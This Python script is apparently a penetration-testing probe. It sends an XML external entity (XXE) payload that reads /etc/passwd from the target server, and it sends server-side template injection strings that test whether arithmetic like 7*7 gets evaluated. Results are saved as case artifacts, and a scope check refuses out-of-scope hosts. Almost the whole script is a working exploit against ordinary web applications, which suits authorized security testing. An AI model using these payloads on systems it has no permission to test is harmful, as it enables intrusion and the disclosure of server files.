#!/usr/bin/env python3
"""Template/XML injection probe: XXE file-read echo + SSTI arithmetic checks."""
from __future__ import annotations

import argparse
import json
import ssl
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path
from urllib.parse import urlparse

CASES = Path("/root/cases")


def send(url: str, data: bytes | None, headers: dict, timeout: float, insecure: bool) -> tuple[int, str]:
    req = urllib.request.Request(url, data=data, headers={"User-Agent": "Mozilla/5.0", **headers},
                                 method="POST" if data is not None else "GET")
    ctx = ssl._create_unverified_context() if insecure else None
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            return r.status, r.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", errors="replace")
    except Exception as e:
        return 0, f"{type(e).__name__}: {e}"


def main() -> int:
    ap = argparse.ArgumentParser(description="XXE / SSTI 注入探针")
    ap.add_argument("action", choices=["xxe", "ssti"], nargs="?", default="xxe")
    ap.add_argument("--url", "-u", required=True)
    ap.add_argument("--scope", required=True)
    ap.add_argument("--case", "-c")
    ap.add_argument("--param", default="name")
    ap.add_argument("--timeout", type=float, default=10)
    ap.add_argument("--insecure", action="store_true")
    args = ap.parse_args()
    host = (urlparse(args.url).hostname or "").lower()
    allowed = args.scope.replace("*.", "").lower()
    if not (host == allowed or host.endswith("." + allowed)):
        print(f"[scope] DENY {host}")
        return 2
    findings = []
    if args.action == "xxe":
        xml = """<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><name>&xxe;</name></root>"""
        st, body = send(args.url, xml.encode(), {"Content-Type": "application/xml"}, args.timeout, args.insecure)
        hit = "root:x:0:0:" in body or "daemon:x:" in body
        findings.append({"probe": "xxe-file-passwd", "status": st, "hit": hit, "len": len(body)})
        print(f"xxe status={st} len={len(body)} file_read={hit}")
        if not hit and body:
            print(f"[body] {body[:300]}")
    else:
        for payload in ("{{7*7}}", "${7*7}", "<%= 7*7 %>"):
            url = args.url + ("&" if "?" in args.url else "?") + urllib.parse.urlencode({args.param: payload})
            st, body = send(url, None, {}, args.timeout, args.insecure)
            hit = "49" in body
            findings.append({"probe": payload, "status": st, "hit": hit, "len": len(body)})
            print(f"ssti {payload!r} status={st} len={len(body)} hit={hit}")
    if args.case:
        case = Path(args.case) if Path(args.case).is_absolute() else CASES / args.case
        (case / "artifacts").mkdir(parents=True, exist_ok=True)
        out = case / "artifacts/tpl_inject.json"
        out.write_text(json.dumps({"url": args.url, "action": args.action, "findings": findings}, ensure_ascii=False, indent=2), encoding="utf-8")
        print(f"[case] {out}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
